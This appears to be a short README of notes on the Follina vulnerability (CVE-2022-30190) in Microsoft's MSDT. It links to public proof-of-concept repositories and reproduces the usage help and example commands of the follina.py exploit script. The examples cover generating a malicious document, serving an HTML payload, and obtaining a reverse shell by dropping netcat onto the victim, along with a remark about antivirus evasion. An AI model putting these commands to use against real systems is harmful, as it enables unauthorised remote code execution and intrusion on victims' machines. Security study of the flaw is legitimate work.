# Follina
Notes related to CVE-2022-30190

FOLLINA: CVE-2022-30190

1.	Uses Microsoft Support Diagnostic Tool (MSDT)
2.	Exploits diagnostic window opened for Diagnosis and when executed properly, gives reverse shell to attacker.

3.	Github: 
    (a).	https://github.com/JohnHammond/msdt-follina
    (b).	https://github.com/chvancooten/follina.py

4.	Thanks to:
    (a).	@_johnhammond
    (b).	@networkchuck

5.	Usage
    follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]
    options:
      -h, --help            show this help message and exit
      --command COMMAND, -c COMMAND
                            command to run on the target (default: calc)
      --output OUTPUT, -o OUTPUT
                            output maldoc file (default: ./follina.doc)
      --interface INTERFACE, -i INTERFACE
                            network interface or IP address to host the HTTP server (default: eth0)
      --port PORT, -p PORT  port to serve the HTTP server (default: 8000)


6.	Examples
    (a).	Pop calc.exe:
          $ python3 follina.py   
          [+] copied staging doc /tmp/9mcvbrwo
          [+] created maldoc ./follina.doc
          [+] serving html payload on :8000
    (b).	Pop notepad.exe:
          $ python3 follina.py -c "notepad"
    (c).	Get a reverse shell on port 9001. 
          Note, this downloads a netcat binary onto the victim and places it in C:\Windows\Tasks. It does not clean up the binary. This will trigger        
          antivirus detections unless AV is disabled.
          $ python3 follina.py -r 9001

	 

